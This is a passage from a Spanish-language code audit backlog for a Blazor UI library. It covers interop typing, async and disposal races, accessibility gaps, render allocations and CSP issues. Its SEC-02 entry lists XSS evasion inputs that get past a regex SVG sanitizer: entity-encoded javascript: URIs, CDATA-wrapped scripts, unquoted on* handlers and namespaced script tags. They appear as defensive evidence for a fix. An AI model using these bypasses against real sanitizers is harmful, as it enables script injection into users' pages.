- **Estado**: ✅ Resuelto (commit `4f7ca94`) — eliminada la TCS `IsModuleTaskLoaded` del base y el `SetResult(true)` del ctor. Strip automático en los 7 interops consumers (Pattern, Draggable, Clipboard, TextArea, Dropdown, Modal, ColorPicker, Theme/Behavior ya lo hacían) elimina todos los `await IsModuleTaskLoaded.Task;` no-op. `ModuleTask.Value` (el `Lazy<Task<IJSObjectReference>>`) sigue siendo el único punto real donde se espera a la carga del módulo JS.
- **Severidad**: Major
- **Esfuerzo**: S
- **Alcance**: `src/CdCSharp.BlazorUI.Core/Abstractions/JSInterop/ModuleJsInteropBase.cs:13,42`; 9 consumers (`DropdownJsInterop.cs`, `ModalJsInterop.cs`, ...).
- **Evidencia**:
  ```csharp
  protected readonly TaskCompletionSource<bool> IsModuleTaskLoaded = new(false);
  public ModuleJsInteropBase(...) {
      ...
      IsModuleTaskLoaded.SetResult(true); // immediately completed
  }
  ```
  Todos los consumers hacen `await IsModuleTaskLoaded.Task; IJSObjectReference module = await ModuleTask.Value;` — el primer await es no-op (la task ya está completa al entrar en cualquier método de la clase). Si la intención era esperar a que el módulo JS esté cargado, la task correcta es `ModuleTask.Value` (el `Lazy<Task<IJSObjectReference>>`), no una TCS redundante. Patrón cargo-cult en los 9 interops.
- **Criterios de aceptación**:
  1. Eliminar `IsModuleTaskLoaded` del base.
  2. Eliminar `await IsModuleTaskLoaded.Task;` de los 9 consumers.
  3. O, si hay una intención original (p. ej. detectar fallo de carga del módulo y completar con `SetException`), cablearla bien: envolver el `Lazy<Task<>>` y completar la TCS desde el catch interno.
- **Notas**: cleanup transversal. Reduce ruido y ~10 líneas por interop.

---

### `JS-05` — `PatternInterop.ts` y `DraggableInterop.ts` usan `any` en callbacks/dotnetRef: `strict: true` mentiroso

- **Estado**: ✅ Resuelto (commit `665a5b8`) — `PatternInterop.PatternCallbacksRelay.invokeMethodAsync` firma `(methodName: string, ...args: unknown[]): Promise<unknown>`. `DraggableInterop`: nueva interfaz `DragCallbacksRelay` con misma firma, reemplaza `dotNetRef: any`. Alinea con patrón ya existente en `DropdownInterop`. Vite bundle verde, 2561 tests verdes.
- **Severidad**: Major
- **Esfuerzo**: XS
- **Alcance**: `src/CdCSharp.BlazorUI/Types/Pattern/PatternInterop.ts:2`, `src/CdCSharp.BlazorUI/Types/Draggable/DraggableInterop.ts:10`.
- **Evidencia**:
  ```typescript
  // PatternInterop.ts
  interface PatternCallbacksRelay {
      invokeMethodAsync(methodName: string, ...args: any[]): Promise<any>;
  }
  // DraggableInterop.ts
  export function startDrag(element: HTMLElement, dotNetRef: any, componentId: string): void { ... }
  ```
  `tsconfig.json:73` activa `"strict": true`, que debería prohibir `any` implícito pero permite explícito. El resto de módulos usa `unknown` o interface tipada (`DropdownCallbacksRelay` en `DropdownInterop.ts:14-16`: `...args: unknown[]): Promise<unknown>`). Los dos rezagados rompen el estándar.
- **Criterios de aceptación**:
  1. `PatternInterop.ts`: cambiar `any[]` → `unknown[]`, `Promise<any>` → `Promise<unknown>`.
  2. `DraggableInterop.ts`: extraer `DraggableCallbacksRelay` interface tipada con los métodos invocados (`OnMouseMove`, `OnMouseUp`) — espejo de `DropdownCallbacksRelay`.
  3. Activar ESLint rule `@typescript-eslint/no-explicit-any` para bloquear regresiones.
- **Notas**: alinea con `JS-08` (forma uniforme entre interops).

---

### `JS-06` — `ThemeInterop.PALETTE_VARS` es lista hardcoded e incompleta: faltan `highlight`, `hover-tint`, `active-tint`, `border`

- **Estado**: ✅ Resuelto (commit `e08439b`) — añadidos los 4 faltantes: `--palette-active-tint`, `--palette-border`, `--palette-highlight`, `--palette-hover-tint`. La lista completa (23 vars) ahora corresponde 1:1 con las propiedades `CssColor` de `BUIThemePaletteBase`. Comentario inline documenta la convención de mantener la lista sincronizada con el C# canónico. Criterio 1 (generar la lista desde C# via `IThemeJsInterop.GetPaletteVariablesAsync`) queda como follow-up mayor. Criterio 2 aplicado.
- **Severidad**: Major
- **Esfuerzo**: S
- **Alcance**: `src/CdCSharp.BlazorUI/Types/Theme/ThemeInterop.ts:39-59`.
- **Evidencia**:
  ```typescript
  const PALETTE_VARS = [
      '--palette-background', '--palette-background-contrast',
      '--palette-black', '--palette-error', '--palette-error-contrast',
      '--palette-info', '--palette-info-contrast',
      '--palette-primary', '--palette-primary-contrast',
      '--palette-secondary', '--palette-secondary-contrast',
      '--palette-shadow', '--palette-success', '--palette-success-contrast',
      '--palette-surface', '--palette-surface-contrast',
      '--palette-warning', '--palette-warning-contrast',
      '--palette-white'
  ];
  ```
  `BUIThemePaletteBase` expone 22 propiedades `CssColor` (19 en paletas reales — ver THEME). Missing aquí: `--palette-highlight`, `--palette-hover-tint`, `--palette-active-tint`, `--palette-border`. Consumidor que llama `getPalette()` obtiene snapshot incompleto.
- **Criterios de aceptación**:
  1. Generar `PALETTE_VARS` desde el C# via `IThemeJsInterop.GetPaletteVariablesAsync()` — fuente única de verdad.
  2. O, si se mantiene lista JS, sincronizarla con `BUIThemePaletteBase` + test de paridad.
  3. Cuando `THEME-07` elimine `Black`/`White` de la base, reflejar aquí.
- **Notas**: depende de `THEME-07` y `THEME-08` (aliased palette).

### `ASYNC-01` — `async void HandleThemeChanged` / `OnMetricsUpdated` con catches incompletos respecto al contrato CLAUDE.md

- **Estado**: ✅ Resuelto (commit `329976e`) — `BUIInitializer.HandleThemeChanged` y `BUIPerformanceDashboard.OnMetricsUpdated` migrados al patrón `void Handler() => _ = HandlerSafeAsync();` con el wrapper `async Task` que cubre el cuarteto canónico (JSDisconnectedException, ObjectDisposedException, InvalidOperationException, TaskCanceledException). Elimina la ruta `async void` cruzando a `SynchronizationContext.Current`. Añadido `@using Microsoft.JSInterop` al dashboard. Criterio 4 (test de dispose durante debounce) queda como follow-up — cerrado mecánicamente por el wrapper.
- **Severidad**: Major
- **Esfuerzo**: S
- **Alcance**:
  - `src/CdCSharp.BlazorUI/Components/Layout/BUIInitializer.razor:46-55` — `private async void HandleThemeChanged(string theme)` captura `ObjectDisposedException` + `JSDisconnectedException`, **falta** `InvalidOperationException` (exigida por el contrato documentado en `CLAUDE.md` §Async / JS interop conventions).
  - `src/CdCSharp.BlazorUI/Components/Diagnostics/BUIPerformanceDashboard.razor:122-135` — `private async void OnMetricsUpdated()` sólo captura `TaskCanceledException`; ignora `ObjectDisposedException`, `JSDisconnectedException`, `InvalidOperationException`.
- **Evidencia**: ambos métodos son handlers de `event Action?` / `event Action<string>?` custom (no `System.EventHandler`). Una excepción no capturada en un `async void` tras el `await` cruza a `SynchronizationContext.Current`; en Blazor Server eso es el `CircuitHost` y provoca *Unhandled error has occurred* + shutdown de circuito. CLAUDE.md fija el triángulo canónico `JSDisconnectedException + InvalidOperationException` (+ `ObjectDisposedException` si hay CTS en el camino) para cualquier await que toque JS interop durante teardown/prerender.
- **Criterios de aceptación**:
  1. Unificar a un patrón: `private void HandleThemeChanged(string theme) => _ = SafeHandleAsync();` con `SafeHandleAsync` privado `async Task` que internamente encapsula el try/catch canónico.
  2. Añadir `InvalidOperationException` al catch de `HandleThemeChanged`.
  3. Añadir `ObjectDisposedException` + `JSDisconnectedException` + `InvalidOperationException` a `OnMetricsUpdated` (además del `TaskCanceledException` existente).
  4. Test que dispone el componente en mitad del debounce y verifica que no se propaga excepción.
- **Notas**: cruza con `ASYNC-03` (patrón fire-and-forget general) y `JS-01` (catches faltantes en módulos).

### `ASYNC-02` — `BUIPerformanceDashboard._debounceCts` nunca es `Dispose()`-ado + race entre `Cancel` y reasignación

- **Estado**: ✅ Resuelto (commit `29a0043`) — `OnMetricsUpdatedSafeAsync` captura el CTS nuevo y dispone el anterior bajo un `lock(_debounceLock)`. Cada reasignación del CTS libera el `WaitHandle` del previo (ya no se acumula presión bajo bursts). `Dispose()` también se protege con el lock + `_disposed` guard, cancela y dispone el CTS final. `catch (ObjectDisposedException)` en los `Cancel()` cubre el caso patológico de cancelación doble.
- **Severidad**: Major
- **Esfuerzo**: S
- **Alcance**: `src/CdCSharp.BlazorUI/Components/Diagnostics/BUIPerformanceDashboard.razor:120-141`.
- **Evidencia**:
  ```csharp
  private CancellationTokenSource? _debounceCts;

  private async void OnMetricsUpdated()
  {
      _debounceCts?.Cancel();
      _debounceCts = new CancellationTokenSource();   // la anterior NO se hace Dispose
      var token = _debounceCts.Token;
      ...
  }

  public void Dispose()
  {
      _debounceCts?.Cancel();                          // Dispose falta aquí también
      PerformanceService.MetricsUpdated -= OnMetricsUpdated;
  }
  ```
  Cada tick del servicio crea un `CancellationTokenSource` nuevo sin disponer el anterior. `CancellationTokenSource` es `IDisposable` porque mantiene un `ManualResetEvent` — el GC los libera, pero bajo carga con muchos updates la presión de `WaitHandle`s acumulados es observable. Además, si otro hilo hace `OnMetricsUpdated` en paralelo (el evento es thread-safe pero el método no), la secuencia `Cancel → asignar → leer Token` puede leer un `token` de un CTS ya sobreescrito.
- **Criterios de aceptación**:
  1. `_debounceCts?.Cancel(); _debounceCts?.Dispose();` antes de cada reasignación y en `Dispose()`.
  2. Serializar entradas con un `lock` o `SemaphoreSlim(1,1)`, o replicar `DelayedActionHandler` (que ya gestiona esto internamente).
  3. Preferible: sustituir la mecánica por `DelayedActionHandler` reutilizable (ver `Core/Utilities/DelayedActionHandler.cs`).
- **Notas**: `DelayedActionHandler.ExecuteWithDelayAsync` ya implementa el patrón correcto (lock + dispose + cancel). Adoptarlo aquí evita reescribir.

### `ASYNC-03` — Patrón fire-and-forget (`_ = XxxAsync(...)`) transversal sin tracking ni manejo de excepciones

- **Severidad**: Major
- **Esfuerzo**: M
- **Alcance**:
  - `src/CdCSharp.BlazorUI/Components/Layout/Dialog/BUIModalHost.razor:40` — `HandleModalChange() => _ = HandleModalChangeAsync();`
  - `src/CdCSharp.BlazorUI/Components/Utils/Tooltip/BUITooltip.razor:271` — `_ = AutoCloseAsync(_autoCloseTokenSource.Token);`
  - `src/CdCSharp.BlazorUI/Components/Layout/Toast/Services/ToastService.cs:212` — `_ = DismissAfterDelayAsync(toast.Id, delay, toast.DismissTokenSource.Token);`
  - `src/CdCSharp.BlazorUI/Components/Layout/Dialog/Services/ModalService.cs:163` — `_ = CloseModalAsync(state);` (desde un `Action` void).
  - `src/CdCSharp.BlazorUI/Components/Generic/Tabs/BUITabs.razor:61,77` — `_ = InvokeAsync(StateHasChanged);`
  - `src/CdCSharp.BlazorUI/Components/Layout/Toast/BUIToastHost.razor:50` — `_ = InvokeAsync(StateHasChanged);`
- **Evidencia**: todos estos call sites descartan la `Task` devuelta. Si el await interno lanza una excepción que *no* sea `TaskCanceledException`/`JSDisconnectedException`/`ObjectDisposedException`, la excepción queda en `Task.UnobservedTaskException` y se perderá hasta GC (si está configurado `ThrowUnobservedTaskExceptions` cae el proceso). Además no hay punto único donde loguear ni esperar a estas tasks en teardown. En `ModalService.OnModalClose` (un `event Action?` sobre el cual consumidores pueden ejecutar lógica síncrona), el fire-and-forget de `CloseModalAsync` significa que `Reference.CloseAsync()` devuelve `Task.CompletedTask` antes de que realmente se haya cerrado.
- **Criterios de aceptación**:
  1. Introducir helper `BUIAsyncHelper.SafeFireAndForget(Func<Task> action, Action<Exception>? onError = null)` en `Core/Utilities/` que envuelve try/catch (`TaskCanceledException`, `JSDisconnectedException`, `ObjectDisposedException`, `InvalidOperationException`) y loguea el resto vía `ILoggerFactory` (opcional, pasado por DI) o `Debug.Fail` en Debug.
  2. Reemplazar los 6 call sites por el helper.
  3. Donde sea posible (`BUITabs.RegisterTab`/`UnregisterTab`, `BUIToastHost.HandleToastChange`), preferir `InvokeAsync(...)` directamente sin descarte (hacer el handler `async Task`).
  4. Documentar el patrón en `CLAUDE.md` → `CLAUDE-xx` (alimenta §3.23): cuándo se acepta fire-and-forget y cómo implementarlo.
- **Notas**: complementa `ASYNC-01`. Posible que parte del trabajo se automatice con analizador `VSTHRD110` (`Microsoft.VisualStudio.Threading.Analyzers`).

### `ASYNC-04` — `BUITooltip` race condition en `_delayTokenSource`: `ObjectDisposedException` posible si re-entrante

- **Estado**: ✅ Resuelto (commit `9d59b74`) — `ShowWithDelay`/`HideWithDelay`/`StartAutoClose` capturan el CTS y su token en variables locales antes del `await Task.Delay`, evitando que `CancelDelay()` re-entrante dispose la referencia compartida mientras la continuación aún la usa. Catches ampliados a `TaskCanceledException` + `ObjectDisposedException`. Añadido guard `if (IsDisposed) return;` tras cada await usando el flag heredado de `BUIComponentBase` (sin re-introducir `_disposed` privado). Criterio 4 (migrar a `DelayedActionHandler`) queda como refactor opcional — el patrón local-CTS elimina la race sin cambiar shape.
- **Severidad**: Major
- **Esfuerzo**: S
- **Alcance**: `src/CdCSharp.BlazorUI/Components/Utils/Tooltip/BUITooltip.razor:210-302`.
- **Evidencia**: `_delayTokenSource` es compartido por `ShowWithDelay` y `HideWithDelay`. Secuencia:
  1. `HideWithDelay()` ejecuta `CancelDelay()` → `_delayTokenSource = new CTS()` → llega a `await Task.Delay(delay, _delayTokenSource.Token)`.
  2. Antes de que el delay expire, otro handler llama `ShowWithDelay()` → `CancelDelay()` hace `_delayTokenSource?.Cancel(); _delayTokenSource?.Dispose(); _delayTokenSource = null;`.
  3. La `Task.Delay` del paso 1 despierta con `OperationCanceledException` (capturado como `TaskCanceledException`), OK.
  4. `ShowWithDelay` crea nuevo CTS, `await Task.Delay(...)`.
  5. Antes de que éste expire, una tercera llamada entra en `CancelDelay()` y dispone el CTS del paso 4 → si ese mismo frame la continuación del paso 4 intenta `cancelDelay`/`Dispose` del token ya disposed → `ObjectDisposedException`.
  
  Los catch sólo capturan `TaskCanceledException`. Además `_isTooltipHovered` se lee post-await sin volver a validar estado disposed.
- **Criterios de aceptación**:
  1. Capturar el token y la referencia del CTS **localmente** dentro de `ShowWithDelay`/`HideWithDelay` antes de awaitar, como hace `DelayedActionHandler`.
  2. Ampliar catches a `TaskCanceledException` + `ObjectDisposedException`.
  3. Añadir disposed-guard post-await: `if (!_isTooltipHovered && !_disposed) { ... }`.
  4. Refactor preferible: sustituir `_delayTokenSource`/`_autoCloseTokenSource` por dos instancias de `DelayedActionHandler`.
- **Notas**: relacionado con `ASYNC-03` (AutoClose fire-and-forget) y `COMP-TOOLTIP-xx` pendientes.

### `ASYNC-05` — `ToastService` no es `IDisposable`/`IAsyncDisposable`: leak de `DismissTokenSource` al teardown

- **Estado**: ✅ Resuelto (commit `b955937`) — `ToastService` implementa `IDisposable`. `Dispose()` recorre `_toasts`, cancela y libera cada `DismissTokenSource`, limpia la lista y despega el handler `OnChange`. `_disposed` guard evita doble-dispose. Criterio 3 (test cancelación en dispose) queda como follow-up — patrón funcionalmente idéntico al existente para `Close`. Registro Scoped del DI liberará el servicio correctamente al cerrar el circuito Server.
- **Severidad**: Major
- **Esfuerzo**: S
- **Alcance**: `src/CdCSharp.BlazorUI/Components/Layout/Toast/Services/ToastService.cs` (no implementa disposable); `ToastState.DismissTokenSource` se dispone únicamente en `Remove(Guid)`.
- **Evidencia**: `ToastService` se registra como servicio Scoped (ver `ServiceCollectionExtensions.AddBlazorUI`). Cuando el circuito de Blazor Server termina o el scope se cierra, `ToastService` se libera sin disponer los `CancellationTokenSource` de toasts activos. Cada CTS activo mantiene `Task.Delay(cts.Token)` pendientes (via `_ = DismissAfterDelayAsync(...)`); esas tareas siguen vivas hasta expirar por timeout o hasta que el CLR descubra que nadie las referencia. En WASM (single-threaded) no es un problema de recursos, pero en Server acumula handles.
- **Criterios de aceptación**:
  1. `public class ToastService : IModalService, IDisposable` (o `IAsyncDisposable`).
  2. `Dispose()` itera `_toasts`, cancela y dispone cada `DismissTokenSource`, limpia la lista.
  3. Test: crear toast con `AutoDismiss=true`, delay=1h, llamar `ToastService.Dispose()` antes del delay, verificar que `CancellationToken.IsCancellationRequested` es `true`.
- **Notas**: mismo patrón aplicable a `ModalService` si añadiese tasks pendientes — hoy no las tiene pero conviene documentar el estándar.

### `A11Y-01` — Toasts no declaran `role="status"|"alert"` ni `aria-live`: cambios no se anuncian a screen readers (WCAG 4.1.3)

- **Severidad**: Major
- **Esfuerzo**: S
- **Alcance**: `src/CdCSharp.BlazorUI/Components/Layout/Toast/BUIToastHost.razor:18-27`; `src/CdCSharp.BlazorUI/Components/Layout/Toast/BUIToast.razor:73-97`.
- **Evidencia**: el `<bui-component data-bui-component="toast-host">` renderizado por `BUIToastHost` y los `<bui-component>` internos de cada `BUIToast` no emiten `role="status"` ni `aria-live="polite"`/`"assertive"`. Incumple WCAG 2.2 AA 4.1.3 Status Messages. Usuarios con lector de pantalla no reciben notificación cuando un toast aparece. Comparar con `BUILoadingIndicator.razor:38` que sí lo hace correctamente.
- **Criterios de aceptación**:
  1. Emitir `role="status" aria-live="polite"` en el contenedor de toasts no-críticos.
  2. Añadir parámetro `ToastSeverity` (info/success/warning/error) que mapee `error` → `role="alert" aria-live="assertive"`.
  3. Añadir `aria-atomic="true"` en el contenedor del toast individual para que el contenido completo se lea al cambiar.
  4. Añadir tests de a11y en `BUIToastAccessibilityTests.cs` (creándolo si no existe — cruza con `TEST-xx` pendiente) que verifican role + aria-live para cada severity.
- **Notas**: cruza con §3.15 PERF si se introduce re-render adicional por aria-atomic.

### `A11Y-02` — `prefers-reduced-motion` no respetado en transiciones CSS globales: incumple WCAG 2.3.3

- **Severidad**: Major
- **Esfuerzo**: S
- **Alcance**: `src/CdCSharp.BlazorUI.BuildTools/Generators/TransitionsCssGenerator.cs` (emite `_transition-classes.css`); `src/CdCSharp.BlazorUI/Components/Layout/Toast/BUIToast.razor:43-44` (usa `animation-duration` sin media query); `src/CdCSharp.BlazorUI/Components/Layout/Dialog/BUIDialog.razor.css` y `BUIDrawer.razor.css` (animaciones de apertura/cierre); `src/CdCSharp.BlazorUI.BuildTools/Infrastructure/BuildTemplates.cs` (template `_base.css`).
- **Evidencia**: `prefers-reduced-motion` sólo aparece en `src/CdCSharp.BlazorUI/Types/Modal/ModalInterop.ts` (JS-side) y en docs. Ninguno de los CSS globales generados ni los `.razor.css` escoped declaran `@media (prefers-reduced-motion: reduce)` para neutralizar animaciones. Usuarios con sensibilidad vestibular reciben animaciones completas aunque hayan indicado lo contrario en SO. Incumple WCAG 2.2 AA 2.3.3 Animation from Interactions.
- **Criterios de aceptación**:
  1. Añadir bloque global en `_reset.css` (o mejor en `_base.css` via `BaseComponentGenerator`) que declare `@media (prefers-reduced-motion: reduce) { *, *::before, *::after { animation-duration: 0.01ms !important; animation-iteration-count: 1 !important; transition-duration: 0.01ms !important; scroll-behavior: auto !important; } }`.
  2. En `_transition-classes.css` (via `TransitionsCssGenerator`) envolver cada keyframe class con la misma media query para degradar a display change instantáneo.
  3. Verificar en `BUIToast`, `BUIDialog`, `BUIDrawer` que el comportamiento funcional (cierre, resolución de promesas) no depende de que la animación termine — si hoy depende de `animationend`, pasar a fallback por timeout cuando reduced-motion esté activo.
  4. Test manual: activar `chrome://flags/#prefers-reduced-motion` y verificar que toast/modal cambian sin animación.
- **Notas**: cruza con `ASYNC-08` (timeout fallback en close animation).

### `A11Y-03` — `outline: none` sin contrapartida `:focus-visible` garantizada en componentes interactivos: incumple WCAG 2.4.7

- **Severidad**: Major
- **Esfuerzo**: S
- **Alcance**: `src/CdCSharp.BlazorUI/Components/Layout/Dialog/BUIDialog.razor.css:8`; `BUIDrawer.razor.css:5`; `BUIModalHost.razor.css:8`; `src/CdCSharp.BlazorUI/Components/Generic/Select/BUISelect.razor.css:64`; `src/CdCSharp.BlazorUI/Components/Internal/_BUIInText.razor.css:14`, `_BUIInSelect.razor.css:13`, `_BUIInNumber.razor.css:14`; `src/CdCSharp.BlazorUI/Components/Utils/Patterns/DateTimePattern/BUIDateTimePattern.razor.css:12,23,58`.
- **Evidencia**: `grep outline:\s*(none|0)` devuelve 10 coincidencias en componentes interactivos. De los archivos con `outline: none`, sólo algunos tienen también `:focus-visible` en el mismo archivo:
  - `BUIDialog.razor.css` — `outline: none` sin `:focus-visible` (el diálogo es `tabindex="-1"`, probablemente no necesita foco propio, pero verificar).
  - `_BUIInText.razor.css`, `_BUIInSelect.razor.css`, `_BUIInNumber.razor.css` — no tienen `:focus-visible`; la visualización de foco depende de `_input-family.css` (outline del wrapper). Riesgo si la cascada no lo alcanza.
  - `BUISelect.razor.css:64` — no tiene `:focus-visible` en el mismo selector interno.
  - `BUIDateTimePattern.razor.css` — 3 `outline: none` sin `:focus-visible`.
- **Criterios de aceptación**:
  1. Para cada archivo listado: (a) si el elemento con `outline: none` no recibe foco (ej. dialog tabindex=-1), añadir comentario que lo justifique; (b) si sí recibe foco, añadir `&:focus-visible { outline: 2px solid var(--palette-primary); outline-offset: 2px; }` (o similar con highlight token del design system).
  2. Añadir regla lint/CI: `grep -l 'outline:\s*0\|outline:\s*none' src/**/*.razor.css` debe coincidir con whitelist documentada.
  3. Test a11y por componente: simular `Tab` hasta el elemento y comprobar que `:focus-visible` está activo (o justificar skip).
- **Notas**: ejecutar auditoría con axe-core (ver `A11Y-10`) para detectar regresiones.

### `A11Y-04` — `BUIButton` no expone `AriaLabel` ni marca `aria-busy="true"` en estado Loading: WCAG 4.1.2 Name/State

- **Severidad**: Major
- **Esfuerzo**: XS
- **Alcance**: `src/CdCSharp.BlazorUI/Components/Generic/Button/BUIButton.razor`.
- **Evidencia**: el parámetro API se limita a `Text`, `LeadingIcon`, `TrailingIcon`. Un button icon-only (sin `Text`, sólo `LeadingIcon`) carece de *nombre accesible*. `grep aria-label BUIButton.razor` → 0 matches. Además, cuando `Loading=true` el button queda disabled pero no declara `aria-busy="true"` ni texto alternativo ("Cargando…"). Incumple WCAG 2.2 AA 4.1.2 Name, Role, Value.
- **Criterios de aceptación**:
  1. Añadir `[Parameter] public string? AriaLabel { get; set; }` y emitirlo en el `<button>` cuando `string.IsNullOrWhiteSpace(Text)`.
  2. Añadir `aria-busy="@(Loading ? "true" : null)"` y `aria-live="polite"` cuando `Loading`.
  3. Validación en Debug: si `Text` es vacío y `AriaLabel` es null → `Debug.WriteLine` warning (icon-only button sin nombre accesible).
  4. Revisar `_BUIBtn` interno y otros buttons (`_BUIPagination`) para el mismo patrón.
- **Notas**: esta task sienta precedente; aplicar mismo análisis a `BUISwitch`, `BUIInputSwitch` (`AriaDescribedBy` ya existe pero `AriaLabel` podría faltar).

### `PERF-01` — `bool.ToString().ToLowerInvariant()` × 7+ call sites en `BuildStyles` / `PatchVolatileAttributes`: allocation de strings por render

- **Estado**: ✅ Resuelto (commit `0d91f42`) — helper `BoolToAttr(bool) => v ? "true" : "false"` en `BUIComponentAttributesBuilder`; 15 call sites sustituidos (14 en `BuildStyles`/`PatchVolatileAttributes` + 1 en Ripple). Criterio 3 queda para `PERF-06` (enum caching de `Size`/`Density`/`Variant.Name`). Criterio 4 (benchmark) opcional; impacto verificado conceptualmente: 2 allocations por estado por render → 0.
- **Severidad**: Major
- **Esfuerzo**: XS
- **Alcance**: `src/CdCSharp.BlazorUI.Core/Components/BUIComponentAttributesBuilder.cs:123,125,127,129,131,133,135,165,226-238` (estados volátiles FullWidth/Loading/Error/Disabled/Active/ReadOnly/Required/Ripple).
- **Evidencia**:
  ```csharp
  ComputedAttributes[...FullWidth] = ((IHasFullWidth)component).FullWidth.ToString().ToLowerInvariant();
  ```
  `bool.ToString()` devuelve `"True"`/`"False"` (strings cacheados por el CLR). `ToLowerInvariant()` sobre ellos crea **string nuevo** cada vez → 2 allocations por render × 7 estados × N componentes × M renders. Lo mismo ocurre en `PatchVolatileAttributes` (ejecutado en cada `BuildRenderTree`, no sólo cuando cambian parámetros).
- **Criterios de aceptación**:
  1. Crear helper interno `private static string BoolToAttr(bool v) => v ? "true" : "false";` (constantes pool).
  2. Sustituir los 14+ call sites.
  3. Para `Size`/`Density`/`Variant.Name` (también `.ToLowerInvariant()` por render), generar un `string` cacheado en el propio enum/variant registry (ver `PERF-06`).
  4. Benchmark (`BenchmarkDotNet`) antes/después: objetivo ≥80% reducción en allocations per `BuildStyles` call.
- **Notas**: fix trivial, impacto medible a escala (páginas con 50+ componentes). Cruza con `PERF-09` baseline.

### `PERF-02` — `BuildStyles` reconstruye `ComputedAttributes` desde cero aunque sólo cambie un parámetro no-estilístico

- **Severidad**: Major
- **Esfuerzo**: M
- **Alcance**: `src/CdCSharp.BlazorUI.Core/Components/BUIComponentAttributesBuilder.cs:80-219`.
- **Evidencia**: `BuildStyles` se llama desde `BUIComponentBase.OnParametersSet()` en **cada** cambio de parámetro, incluido cuando el parámetro cambiado no afecta al estilo (`OnClick`, `ChildContent`, callbacks). Hace `ComputedAttributes.Clear()`, re-copia `additionalAttributes`, chequea 20+ flags, ejecuta `ToString()` sobre cada estado, y rebuildea el `style` string. Para un `BUIButton` cuyo padre le pasa una closure nueva cada render, `BuildStyles` corre aunque el output sería idéntico.
- **Criterios de aceptación**:
  1. Introducir *fingerprint* de inputs (tupla o hash de los valores que afectan al estilo) — almacenar `_lastFingerprint`.
  2. Si fingerprint no cambió, saltar reconstrucción completa (mantener `ComputedAttributes` actual).
  3. Verificar que `PatchVolatileAttributes` sigue ejecutándose en cada render para recoger cambios de estado volátil (que no pasan por OnParametersSet en todos los casos).
  4. Tests de regresión: snapshot tests existentes deben seguir pasando; añadir test de "no-op render" que verifica el dictionario es reference-equal si nada cambió.
- **Notas**: depende de `PERF-09` (baseline) para medir impacto. Alternativa menos costosa: factorizar `BuildStyles` en dos fases (static vars vs dynamic) y sólo recomputar la fase dinámica.

### `PERF-03` — `BuildInlineStyles` siempre asigna `ComputedAttributes["style"]` sin comparar con el valor anterior

- **Estado**: ✅ Resuelto (commit `9463cdd`) — `_lastStyleString` cacheado en el builder; `StyleBuilderMatchesCached()` compara char-a-char contra el `StringBuilder` antes de materializar. Si coinciden, reusa la misma string instance → 0 allocations en el path change-nothing-render. 2561 tests verdes.
- **Severidad**: Major
- **Esfuerzo**: S
- **Alcance**: `src/CdCSharp.BlazorUI.Core/Components/BUIComponentAttributesBuilder.cs:275-298`.
- **Evidencia**:
  ```csharp
  if (_styleBuilder.Length > 0)
      ComputedAttributes["style"] = _styleBuilder.ToString();
  ```
  `_styleBuilder.ToString()` allocate un string nuevo, incluso si es idéntico al anterior. El diff del renderer de Blazor detecta que el value del attr no cambió (short-circuit correcto), pero la allocation del string ocurrió. Sobre 100 componentes × 60fps en una página animada = 6k strings efímeras por segundo.
- **Criterios de aceptación**:
  1. Cachear `_lastStyleString` en el builder.
  2. Comparar `_styleBuilder` con `_lastStyleString` antes de llamar a `ToString()` (posible via `StringBuilder.Equals` manual char-a-char, o `CompareOrdinal`).
  3. Si son iguales, reusar `_lastStyleString` en el dict.
  4. Benchmark: reducción de allocations en workflow `change-nothing-render`.
- **Notas**: fix simple aplicable tras `PERF-01` (ya habremos bajado la allocation baseline).

### `SEC-01` — `BUIInitializer.razor` inyecta `<script>` inline en `<HeadContent>`: incompatible con CSP estricta

- **Severidad**: Major
- **Esfuerzo**: M
- **Alcance**: `src/CdCSharp.BlazorUI/Components/Layout/BUIInitializer.razor:8-16`.
- **Evidencia**:
  ```razor
  <HeadContent>
      <script>
          (function(){
              var t=localStorage.getItem('blazorui-theme')||'dark';
              document.documentElement.setAttribute('data-theme',t);
          })();
      </script>
  </HeadContent>
  ```
  Un inline `<script>` sin `nonce`/hash requiere `script-src 'unsafe-inline'` en la CSP del host app. Aplicaciones con CSP estricta (requerida por muchas orgs financieras/gov) no podrán usar la librería sin relajar su política — reduciendo la seguridad del host globalmente.
- **Criterios de aceptación**:
  1. **[Decisión F1 D-15]** Mantener el script inline en `<HeadContent>` (preserva la prevención del *theme flash*), pero **parametrizable con `nonce`**. Añadir `[Parameter] public string? CspNonce { get; set; }` a `BUIInitializer` que, si no es null, emite `<script nonce="@CspNonce">`. El consumer lo pasa desde `HttpContext.Features.Get<INonceFeature>()` (Server) o desde una prop provisioning (WASM).
  2. Publicar guía CSP en docs/CLAUDE.md: patrón recomendado para Server (middleware Microsoft.AspNetCore.Security que inyecta nonce por request) y WASM (consumer provee nonce estático o deshabilita CSP estricta si su app no lo requiere).
  3. Añadir fallback: si el consumer no quiere inline script, puede no incluir `BUIInitializer` y llamar a `themeInterop.initializeTheme()` desde `OnAfterRenderAsync` (asumiendo theme flash aceptable).
  4. Documentar la política CSP recomendada en `CLAUDE.md` → `CLAUDE-xx` (alimenta §3.23) y en la docs WASM con ejemplo copy-paste.
  5. Tests: renderizar `BUIInitializer` con `CspNonce="abc123"` → DOM contiene `<script nonce="abc123">`; sin nonce → script plain (compat con CSP `'unsafe-inline'` o sin CSP).
- **Notas**: bloquea adopción en entornos high-security. Priorizar. Decisión D-15 (ver §Directivas de diseño): inline + nonce confirmada para mantener anti-flash sin sacrificar CSP estricta.

### `SEC-02` — `SvgMarkupSanitizer` basado en regex: evasiones conocidas con entidades HTML, CDATA y atributos multilinea

- **Severidad**: Major
- **Esfuerzo**: M
- **Alcance**: `src/CdCSharp.BlazorUI/Components/Generic/Svg/SvgMarkupSanitizer.cs`; `BUISvgIcon.razor:38`.
- **Evidencia**: el sanitizer usa 4 regex para eliminar `script|iframe|object|embed|foreignObject`, handlers `on*`, y `href`/`xlink:href` con scheme `javascript:`. Patrones evasibles conocidos:
  - Entidades decimales/hex: `&#106;avascript:` (javascript con `j` escapada) pasa `JavaScriptUriRegex` porque no match del literal.
  - CDATA: `<![CDATA[<script>evil()</script>]]>` no es alcanzado por las regex.
  - Atributos partidos con whitespace: `on\nclick = "..."` o tabs múltiples pueden evadir dependiendo del engine (aquí `\s+` debería cubrir pero vale test).
  - Atributos sin comillas: `onclick=alert(1)` matchea `[^\s>]+` — OK aquí pero es frágil.
  - Namespaces: `<svg:script>`, `<ns0:script>` en SVG namespaced — no coincide con `\bscript\b`.
  
